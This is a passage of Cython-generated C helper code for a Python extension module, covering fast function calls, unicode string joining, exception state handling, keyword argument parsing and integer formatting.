static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = __Pyx_CyOrPyCFunction_GET_FUNCTION(func);
    self = __Pyx_CyOrPyCFunction_GET_SELF(func);
    #if PY_MAJOR_VERSION < 3
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    #else
    if (unlikely(Py_EnterRecursiveCall(" while calling a Python object")))
        return NULL;
    #endif
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectFastCall */
#if PY_VERSION_HEX < 0x03090000 || CYTHON_COMPILING_IN_LIMITED_API
static PyObject* __Pyx_PyObject_FastCall_fallback(PyObject *func, PyObject **args, size_t nargs, PyObject *kwargs) {
    PyObject *argstuple;
    PyObject *result = 0;
    size_t i;
    argstuple = PyTuple_New((Py_ssize_t)nargs);
    if (unlikely(!argstuple)) return NULL;
    for (i = 0; i < nargs; i++) {
        Py_INCREF(args[i]);
        if (__Pyx_PyTuple_SET_ITEM(argstuple, (Py_ssize_t)i, args[i]) < 0) goto bad;
    }
    result = __Pyx_PyObject_Call(func, argstuple, kwargs);
  bad:
    Py_DECREF(argstuple);
    return result;
}
#endif
static CYTHON_INLINE PyObject* __Pyx_PyObject_FastCallDict(PyObject *func, PyObject **args, size_t _nargs, PyObject *kwargs) {
    Py_ssize_t nargs = __Pyx_PyVectorcall_NARGS(_nargs);
#if CYTHON_COMPILING_IN_CPYTHON
    if (nargs == 0 && kwargs == NULL) {
        if (__Pyx_CyOrPyCFunction_Check(func) && likely( __Pyx_CyOrPyCFunction_GET_FLAGS(func) & METH_NOARGS))
            return __Pyx_PyObject_CallMethO(func, NULL);
    }
    else if (nargs == 1 && kwargs == NULL) {
        if (__Pyx_CyOrPyCFunction_Check(func) && likely( __Pyx_CyOrPyCFunction_GET_FLAGS(func) & METH_O))
            return __Pyx_PyObject_CallMethO(func, args[0]);
    }
#endif
    #if PY_VERSION_HEX < 0x030800B1
    #if CYTHON_FAST_PYCCALL
    if (PyCFunction_Check(func)) {
        if (kwargs) {
            return _PyCFunction_FastCallDict(func, args, nargs, kwargs);
        } else {
            return _PyCFunction_FastCallKeywords(func, args, nargs, NULL);
        }
    }
    #if PY_VERSION_HEX >= 0x030700A1
    if (!kwargs && __Pyx_IS_TYPE(func, &PyMethodDescr_Type)) {
        return _PyMethodDescr_FastCallKeywords(func, args, nargs, NULL);
    }
    #endif
    #endif
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs);
    }
    #endif
    #endif
    if (kwargs == NULL) {
        #if CYTHON_VECTORCALL
        #if PY_VERSION_HEX < 0x03090000
        vectorcallfunc f = _PyVectorcall_Function(func);
        #else
        vectorcallfunc f = PyVectorcall_Function(func);
        #endif
        if (f) {
            return f(func, args, (size_t)nargs, NULL);
        }
        #elif defined(__Pyx_CyFunction_USED) && CYTHON_BACKPORT_VECTORCALL
        if (__Pyx_CyFunction_CheckExact(func)) {
            __pyx_vectorcallfunc f = __Pyx_CyFunction_func_vectorcall(func);
            if (f) return f(func, args, (size_t)nargs, NULL);
        }
        #endif
    }
    if (nargs == 0) {
        return __Pyx_PyObject_Call(func, __pyx_empty_tuple, kwargs);
    }
    #if PY_VERSION_HEX >= 0x03090000 && !CYTHON_COMPILING_IN_LIMITED_API
    return PyObject_VectorcallDict(func, args, (size_t)nargs, kwargs);
    #else
    return __Pyx_PyObject_FastCall_fallback(func, args, (size_t)nargs, kwargs);
    #endif
}

/* PyObjectCallOneArg */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *args[2] = {NULL, arg};
    return __Pyx_PyObject_FastCall(func, args+1, 1 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET);
}

/* JoinPyUnicode */
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      Py_UCS4 max_char) {
#if CYTHON_USE_UNICODE_INTERNALS && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    PyObject *result_uval;
    int result_ukind, kind_shift;
    Py_ssize_t i, char_pos;
    void *result_udata;
    CYTHON_MAYBE_UNUSED_VAR(max_char);
#if CYTHON_PEP393_ENABLED
    result_uval = PyUnicode_New(result_ulength, max_char);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = (max_char <= 255) ? PyUnicode_1BYTE_KIND : (max_char <= 65535) ? PyUnicode_2BYTE_KIND : PyUnicode_4BYTE_KIND;
    kind_shift = (result_ukind == PyUnicode_4BYTE_KIND) ? 2 : result_ukind - 1;
    result_udata = PyUnicode_DATA(result_uval);
#else
    result_uval = PyUnicode_FromUnicode(NULL, result_ulength);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = sizeof(Py_UNICODE);
    kind_shift = (result_ukind == 4) ? 2 : result_ukind - 1;
    result_udata = PyUnicode_AS_UNICODE(result_uval);
#endif
    assert(kind_shift == 2 || kind_shift == 1 || kind_shift == 0);
    char_pos = 0;
    for (i=0; i < value_count; i++) {
        int ukind;
        Py_ssize_t ulength;
        void *udata;
        PyObject *uval = PyTuple_GET_ITEM(value_tuple, i);
        if (unlikely(__Pyx_PyUnicode_READY(uval)))
            goto bad;
        ulength = __Pyx_PyUnicode_GET_LENGTH(uval);
        if (unlikely(!ulength))
            continue;
        if (unlikely((PY_SSIZE_T_MAX >> kind_shift) - ulength < char_pos))
            goto overflow;
        ukind = __Pyx_PyUnicode_KIND(uval);
        udata = __Pyx_PyUnicode_DATA(uval);
        if (!CYTHON_PEP393_ENABLED || ukind == result_ukind) {
            memcpy((char *)result_udata + (char_pos << kind_shift), udata, (size_t) (ulength << kind_shift));
        } else {
            #if PY_VERSION_HEX >= 0x030d0000
            if (unlikely(PyUnicode_CopyCharacters(result_uval, char_pos, uval, 0, ulength) < 0)) goto bad;
            #elif CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030300F0 || defined(_PyUnicode_FastCopyCharacters)
            _PyUnicode_FastCopyCharacters(result_uval, char_pos, uval, 0, ulength);
            #else
            Py_ssize_t j;
            for (j=0; j < ulength; j++) {
                Py_UCS4 uchar = __Pyx_PyUnicode_READ(ukind, udata, j);
                __Pyx_PyUnicode_WRITE(result_ukind, result_udata, char_pos+j, uchar);
            }
            #endif
        }
        char_pos += ulength;
    }
    return result_uval;
overflow:
    PyErr_SetString(PyExc_OverflowError, "join() result is too long for a Python string");
bad:
    Py_DECREF(result_uval);
    return NULL;
#else
    CYTHON_UNUSED_VAR(max_char);
    CYTHON_UNUSED_VAR(result_ulength);
    CYTHON_UNUSED_VAR(value_count);
    return PyUnicode_Join(__pyx_empty_unicode, value_tuple);
#endif
}

/* PyObjectLookupSpecial */
#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx__PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name, int with_error) {
    PyObject *res;
    PyTypeObject *tp = Py_TYPE(obj);
#if PY_MAJOR_VERSION < 3
    if (unlikely(PyInstance_Check(obj)))
        return with_error ? __Pyx_PyObject_GetAttrStr(obj, attr_name) : __Pyx_PyObject_GetAttrStrNoError(obj, attr_name);
#endif
    res = _PyType_Lookup(tp, attr_name);
    if (likely(res)) {
        descrgetfunc f = Py_TYPE(res)->tp_descr_get;
        if (!f) {
            Py_INCREF(res);
        } else {
            res = f(res, obj, (PyObject *)tp);
        }
    } else if (with_error) {
        PyErr_SetObject(PyExc_AttributeError, attr_name);
    }
    return res;
}
#endif

/* GetTopmostException */
#if CYTHON_USE_EXC_INFO_STACK && CYTHON_FAST_THREAD_STATE
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_value == NULL || exc_info->exc_value == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif

/* SaveResetException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
  #if CYTHON_USE_EXC_INFO_STACK && PY_VERSION_HEX >= 0x030B00a4
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    PyObject *exc_value = exc_info->exc_value;
    if (exc_value == NULL || exc_value == Py_None) {
        *value = NULL;
        *type = NULL;
        *tb = NULL;
    } else {
        *value = exc_value;
        Py_INCREF(*value);
        *type = (PyObject*) Py_TYPE(exc_value);
        Py_INCREF(*type);
        *tb = PyException_GetTraceback(exc_value);
    }
  #elif CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
  #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
  #endif
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
  #if CYTHON_USE_EXC_INFO_STACK && PY_VERSION_HEX >= 0x030B00a4
    _PyErr_StackItem *exc_info = tstate->exc_info;
    PyObject *tmp_value = exc_info->exc_value;
    exc_info->exc_value = value;
    Py_XDECREF(tmp_value);
    Py_XDECREF(type);
    Py_XDECREF(tb);
  #else
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
  #endif
}
#endif

/* GetException */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type = NULL, *local_value, *local_tb = NULL;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
  #if PY_VERSION_HEX >= 0x030C00A6
    local_value = tstate->current_exception;
    tstate->current_exception = 0;
    if (likely(local_value)) {
        local_type = (PyObject*) Py_TYPE(local_value);
        Py_INCREF(local_type);
        local_tb = PyException_GetTraceback(local_value);
    }
  #else
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
  #endif
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE && PY_VERSION_HEX >= 0x030C00A6
    if (unlikely(tstate->current_exception))
#elif CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
      #if PY_VERSION_HEX >= 0x030B00a4
        tmp_value = exc_info->exc_value;
        exc_info->exc_value = local_value;
        tmp_type = NULL;
        tmp_tb = NULL;
        Py_XDECREF(local_type);
        Py_XDECREF(local_tb);
      #else
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
      #endif
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}

/* RaiseDoubleKeywords */
static void __Pyx_RaiseDoubleKeywordsError(
    const char* func_name,
    PyObject* kw_name)
{
    PyErr_Format(PyExc_TypeError,
        #if PY_MAJOR_VERSION >= 3
        "%s() got multiple values for keyword argument '%U'", func_name, kw_name);
        #else
        "%s() got multiple values for keyword argument '%s'", func_name,
        PyString_AsString(kw_name));
        #endif
}

/* ParseKeywords */
static int __Pyx_ParseOptionalKeywords(
    PyObject *kwds,
    PyObject *const *kwvalues,
    PyObject **argnames[],
    PyObject *kwds2,
    PyObject *values[],
    Py_ssize_t num_pos_args,
    const char* function_name)
{
    PyObject *key = 0, *value = 0;
    Py_ssize_t pos = 0;
    PyObject*** name;
    PyObject*** first_kw_arg = argnames + num_pos_args;
    int kwds_is_tuple = CYTHON_METH_FASTCALL && likely(PyTuple_Check(kwds));
    while (1) {
        Py_XDECREF(key); key = NULL;
        Py_XDECREF(value); value = NULL;
        if (kwds_is_tuple) {
            Py_ssize_t size;
#if CYTHON_ASSUME_SAFE_MACROS
            size = PyTuple_GET_SIZE(kwds);
#else
            size = PyTuple_Size(kwds);
            if (size < 0) goto bad;
#endif
            if (pos >= size) break;
#if CYTHON_AVOID_BORROWED_REFS
            key = __Pyx_PySequence_ITEM(kwds, pos);
            if (!key) goto bad;
#elif CYTHON_ASSUME_SAFE_MACROS
            key = PyTuple_GET_ITEM(kwds, pos);
#else
            key = PyTuple_GetItem(kwds, pos);
            if (!key) goto bad;
#endif
            value = kwvalues[pos];
            pos++;
        }
        else
        {
            if (!PyDict_Next(kwds, &pos, &key, &value)) break;
#if CYTHON_AVOID_BORROWED_REFS
            Py_INCREF(key);
#endif
        }
        name = first_kw_arg;
        while (*name && (**name != key)) name++;
        if (*name) {
            values[name-argnames] = value;
#if CYTHON_AVOID_BORROWED_REFS
            Py_INCREF(value);
            Py_DECREF(key);
#endif
            key = NULL;
            value = NULL;
            continue;
        }
#if !CYTHON_AVOID_BORROWED_REFS
        Py_INCREF(key);
#endif
        Py_INCREF(value);
        name = first_kw_arg;
        #if PY_MAJOR_VERSION < 3
        if (likely(PyString_Check(key))) {
            while (*name) {
                if ((CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**name) == PyString_GET_SIZE(key))
                        && _PyString_Eq(**name, key)) {
                    values[name-argnames] = value;
#if CYTHON_AVOID_BORROWED_REFS
                    value = NULL;
#endif
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    if ((**argname == key) || (
                            (CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**argname) == PyString_GET_SIZE(key))
                             && _PyString_Eq(**argname, key))) {
                        goto arg_passed_twice;
                    }
                    argname++;
                }
            }
        } else
        #endif
        if (likely(PyUnicode_Check(key))) {
            while (*name) {
                int cmp = (
                #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                    (__Pyx_PyUnicode_GET_LENGTH(**name) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                #endif
                    PyUnicode_Compare(**name, key)
                );
                if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                if (cmp == 0) {
                    values[name-argnames] = value;
#if CYTHON_AVOID_BORROWED_REFS
                    value = NULL;
#endif
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    int cmp = (**argname == key) ? 0 :
                    #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                        (__Pyx_PyUnicode_GET_LENGTH(**argname) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                    #endif
                        PyUnicode_Compare(**argname, key);
                    if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                    if (cmp == 0) goto arg_passed_twice;
                    argname++;
                }
            }
        } else
            goto invalid_keyword_type;
        if (kwds2) {
            if (unlikely(PyDict_SetItem(kwds2, key, value))) goto bad;
        } else {
            goto invalid_keyword;
        }
    }
    Py_XDECREF(key);
    Py_XDECREF(value);
    return 0;
arg_passed_twice:
    __Pyx_RaiseDoubleKeywordsError(function_name, key);
    goto bad;
invalid_keyword_type:
    PyErr_Format(PyExc_TypeError,
        "%.200s() keywords must be strings", function_name);
    goto bad;
invalid_keyword:
    #if PY_MAJOR_VERSION < 3
    PyErr_Format(PyExc_TypeError,
        "%.200s() got an unexpected keyword argument '%.200s'",
        function_name, PyString_AsString(key));
    #else
    PyErr_Format(PyExc_TypeError,
        "%s() got an unexpected keyword argument '%U'",
        function_name, key);
    #endif
bad:
    Py_XDECREF(key);
    Py_XDECREF(value);
    return -1;
}

/* RaiseArgTupleInvalid */
static void __Pyx_RaiseArgtupleInvalid(
    const char* func_name,
    int exact,
    Py_ssize_t num_min,
    Py_ssize_t num_max,
    Py_ssize_t num_found)
{
    Py_ssize_t num_expected;
    const char *more_or_less;
    if (num_found < num_min) {
        num_expected = num_min;
        more_or_less = "at least";
    } else {
        num_expected = num_max;
        more_or_less = "at most";
    }
    if (exact) {
        more_or_less = "exactly";
    }
    PyErr_Format(PyExc_TypeError,
                 "%.200s() takes %.8s %" CYTHON_FORMAT_SSIZE_T "d positional argument%.1s (%" CYTHON_FORMAT_SSIZE_T "d given)",
                 func_name, more_or_less, num_expected,
                 (num_expected == 1) ? "" : "s", num_found);
}

/* CIntToDigits */
static const char DIGIT_PAIRS_10[2*10*10+1] = {
    "00010203040506070809"
    "10111213141516171819"
    "20212223242526272829"
    "30313233343536373839"
    "40414243444546474849"
    "50515253545556575859"
    "60616263646566676869"
    "70717273747576777879"
    "80818283848586878889"
    "90919293949596979899"
};
static const char DIGIT_PAIRS_8[2*8*8+1] = {
    "0001020304050607"
    "1011121314151617"
    "2021222324252627"
    "3031323334353637"
    "4041424344454647"
    "5051525354555657"
    "6061626364656667"
    "7071727374757677"
};
static const char DIGITS_HEX[2*16+1] = {
    "0123456789abcdef"
    "0123456789ABCDEF"
};

/* BuildPyUnicode */
static PyObject* __Pyx_PyUnicode_BuildFromAscii(Py_ssize_t ulength, char* chars, int clength,
                                                int prepend_sign, char padding_char) {
    PyObject *uval;
    Py_ssize_t uoffset = ulength - clength;
#if CYTHON_USE_UNICODE_INTERNALS
    Py_ssize_t i;
#if CYTHON_PEP393_ENABLED
    void *udata;
    uval = PyUnicode_New(ulength, 127);
    if (unlikely(!uval)) return NULL;
    udata = PyUnicode_DATA(uval);
#else
    Py_UNICODE *udata;
    uval = PyUnicode_FromUnicode(NULL, ulength);
    if (unlikely(!uval)) return NULL;
    udata = PyUnicode_AS_UNICODE(uval);
#endif
    if (uoffset > 0) {
        i = 0;
        if (prepend_sign) {
            __Pyx_PyUnicode_WRITE(PyUnicode_1BYTE_KIND, udata, 0, '-');
            i++;
        }
        for (; i < uoffset; i++) {
            __Pyx_PyUnicode_WRITE(PyUnicode_1BYTE_KIND, udata, i, padding_char);
        }
    }
    for (i=0; i < clength; i++) {
        __Pyx_PyUnicode_WRITE(PyUnicode_1BYTE_KIND, udata, uoffset+i, chars[i]);
    }
#else
    {
        PyObject *sign = NULL, *padding = NULL;
        uval = NULL;
        if (uoffset > 0) {
            prepend_sign = !!prepend_sign;
            if (uoffset > prepend_sign) {
                padding = PyUnicode_FromOrdinal(padding_char);
                if (likely(padding) && uoffset > prepend_sign + 1) {
                    PyObject *tmp;
                    PyObject *repeat = PyInt_FromSsize_t(uoffset - prepend_sign);
                    if (unlikely(!repeat)) goto done_or_error;
                    tmp = PyNumber_Multiply(padding, repeat);
                    Py_DECREF(repeat);
                    Py_DECREF(padding);
                    padding = tmp;
                }
                if (unlikely(!padding)) goto done_or_error;
            }
            if (prepend_sign) {
                sign = PyUnicode_FromOrdinal('-');
                if (unlikely(!sign)) goto done_or_error;
            }
        }
        uval = PyUnicode_DecodeASCII(chars, clength, NULL);
        if (likely(uval) && padding) {
            PyObject *tmp = PyNumber_Add(padding, uval);
            Py_DECREF(uval);
            uval = tmp;
        }
        if (likely(uval) && sign) {
            PyObject *tmp = PyNumber_Add(sign, uval);
            Py_DECREF(uval);
            uval = tmp;
        }
done_or_error:
        Py_XDECREF(padding);
        Py_XDECREF(sign);
    }
#endif
    return uval;
}

/* CIntToPyUnicode */
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_From_Py_ssize_t(Py_ssize_t value, Py_ssize_t width, char padding_char, char format_char) {
    char digits[sizeof(Py_ssize_t)*3+2];
    char *dpos, *end = digits + sizeof(Py_ssize_t)*3+2;
    const char *hex_digits = DIGITS_HEX;
    Py_ssize_t length, ulength;
    int prepend_sign, last_one_off;
    Py_ssize_t remaining;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const Py_ssize_t neg_one = (Py_ssize_t) -1, const_zero = (Py_ssize_t) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (format_char == 'X') {
        hex_digits += 16;
        format_char = 'x';
    }
    remaining = value;
    last_one_off = 0;
    dpos = end;
    do {
        int digit_pos;
        switch (format_char) {
        case 'o':
            digit_pos = abs((int)(remaining % (8*8)));
            remaining = (Py_ssize_t) (remaining / (8*8));
            dpos -= 2;
            memcpy(dpos, DIGIT_PAIRS_8 + digit_pos * 2, 2);
            last_one_off = (digit_pos < 8);
            break;
        case 'd':
            digit_pos = abs((int)(remaining % (10*10)));
            remaining = (Py_ssize_t) (remaining / (10*10));
            dpos -= 2;
            memcpy(dpos, DIGIT_PAIRS_10 + digit_pos * 2, 2);
            last_one_off = (digit_pos < 10);
            break;
        case 'x':
            *(--dpos) = hex_digits[abs((int)(remaining % 16))];
            remaining = (Py_ssize_t) (remaining / 16);
            break;
        default:
            assert(0);
            break;
        }
    } while (unlikely(remaining != 0));
    assert(!last_one_off || *dpos == '0');
    dpos += last_one_off;
    length = end - dpos;
    ulength = length;
    prepend_sign = 0;
    if (!is_unsigned && value <= neg_one) {
        if (padding_char == ' ' || width <= length + 1) {
            *(--dpos) = '-';
            ++length;
        } else {
            prepend_sign = 1;
        }
        ++ulength;
    }
    if (width > ulength) {
        ulength = width;
    }
    if (ulength == 1) {
        return PyUnicode_FromOrdinal(*dpos);
    }
    return __Pyx_PyUnicode_BuildFromAscii(ulength, dpos, (int) length, prepend_sign, padding_char);
}

/* PyObjectCall2Args */
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {
    PyObject *args[3] = {NULL, arg1, arg2};
    return __Pyx_PyObject_FastCall(function, args+1, 2 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET);
}

/* PyObjectGetMethod */
static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method) {
    PyObject *attr;
#if CYTHON_UNPACK_METHODS && CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_PYTYPE_LOOKUP
    __Pyx_TypeName type_name;
    PyTypeObject *tp = Py_TYPE(obj);
    PyObject *descr;
    descrgetfunc f = NULL;
    PyObject **dictptr, *dict;
    int meth_found = 0;
    assert (*method == NULL);
    if (unlikely(tp->tp_getattro != PyObject_GenericGetAttr)) {
        attr = __Pyx_PyObject_GetAttrStr(obj, name);
        goto try_unpack;
    }
    if (unlikely(tp->tp_dict == NULL) && unlikely(PyType_Ready(tp) < 0)) {
        return 0;
    }
    descr = _PyType_Lookup(tp, name);
    if (likely(descr != NULL)) {
        Py_INCREF(descr);
#if defined(Py_TPFLAGS_METHOD_DESCRIPTOR) && Py_TPFLAGS_METHOD_DESCRIPTOR
        if (__Pyx_PyType_HasFeature(Py_TYPE(descr), Py_TPFLAGS_METHOD_DESCRIPTOR))
#elif PY_MAJOR_VERSION >= 3
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || __Pyx_IS_TYPE(descr, &PyMethodDescr_Type) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr) || __Pyx_IS_TYPE(descr, &PyMethodDescr_Type)))
        #endif
#else
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr)))
        #endif
#endif
        {
            meth_found = 1;
        } else {
            f = Py_TYPE(descr)->tp_descr_get;
            if (f != NULL && PyDescr_IsData(descr)) {
                attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
                Py_DECREF(descr);
                goto try_unpack;
            }
        }
    }
    dictptr = _PyObject_GetDictPtr(obj);
    if (dictptr != NULL && (dict = *dictptr) != NULL) {
        Py_INCREF(dict);
        attr = __Pyx_PyDict_GetItemStr(dict, name);
        if (attr != NULL) {
            Py_INCREF(attr);
            Py_DECREF(dict);
            Py_XDECREF(descr);
            goto try_unpack;
        }
        Py_DECREF(dict);
    }
    if (meth_found) {
        *method = descr;
        return 1;
    }
    if (f != NULL) {
        attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
        Py_DECREF(descr);
        goto try_unpack;
    }
    if (likely(descr != NULL)) {
        *method = descr;
        return 0;
    }
    type_name = __Pyx_PyType_GetName(tp);
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'" __Pyx_FMT_TYPENAME "' object has no attribute '%U'",
                 type_name, name);
#else
                 "'" __Pyx_FMT_TYPENAME "' object has no attribute '%.400s'",
                 type_name, PyString_AS_STRING(name));
#endif
    __Pyx_DECREF_TypeName(type_name);
    return 0;
#else
    attr = __Pyx_PyObject_GetAttrStr(obj, name);
    goto try_unpack;
#endif
try_unpack:
#if CYTHON_UNPACK_METHODS
    if (likely(attr) && PyMethod_Check(attr) && likely(PyMethod_GET_SELF(attr) == obj)) {
        PyObject *function = PyMethod_GET_FUNCTION(attr);
        Py_INCREF(function);
        Py_DECREF(attr);
        *method = function;
        return 1;
    }
#endif
    *method = attr;
    return 0;
}

/* PyObjectCallMethod1 */
#if !(CYTHON_VECTORCALL && __PYX_LIMITED_VERSION_HEX >= 0x030C00A2)
static PyObject* __Pyx__PyObject_CallMethod1(PyObject* method, PyObject* arg) {
    PyObject *result = __Pyx_PyObject_CallOneArg(method, arg);
    Py_DECREF(method);
    return result;
}
#endif
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg) {
#if CYTHON_VECTORCALL && __PYX_LIMITED_VERSION_HEX >= 0x030C00A2
    PyObject *args[2] = {obj, arg};
    (void) __Pyx_PyObject_GetMethod;
    (void) __Pyx_PyObject_CallOneArg;
    (void) __Pyx_PyObject_Call2Args;
    return PyObject_VectorcallMethod(method_name, args, 2 | PY_VECTORCALL_ARGUMENTS_OFFSET, NULL);
#else
    PyObject *method = NULL, *result;
    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);
    if (likely(is_method)) {
        result = __Pyx_PyObject_Call2Args(method, obj, arg);
        Py_DECREF(method);
        return result;
    }
    if (unlikely(!method)) return NULL;
    return __Pyx__PyObject_CallMethod1(method, arg);
#endif
}

/* append */
static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x) {
    if (likely(PyList_CheckExact(L))) {
        if (unlikely(__Pyx_PyList_Append(L, x) < 0)) return -1;
    } else {
        PyObject* retval = __Pyx_PyObject_CallMethod1(L, __pyx_n_s_append, x);
        if (unlikely(!retval))
            return -1;
        Py_DECREF(retval);
    }
    return 0;
}

/* DictGetItem */
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key) {
    PyObject *value;
    value = PyDict_GetItemWithError(d, key);
    if (unlikely(!value)) {
        if (!PyErr_Occurred()) {
            if (unlikely(PyTuple_Check(key))) {
                PyObject* args = PyTuple_Pack(1, key);
                if (likely(args)) {
                    PyErr_SetObject(PyExc_KeyError, args);
                    Py_DECREF(args);
                }
            } else {
                PyErr_SetObject(PyExc_KeyError, key);
            }
        }
        return NULL;
    }
    Py_INCREF(value);
    return value;
}
#endif

/* PyIntBinop */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check) {
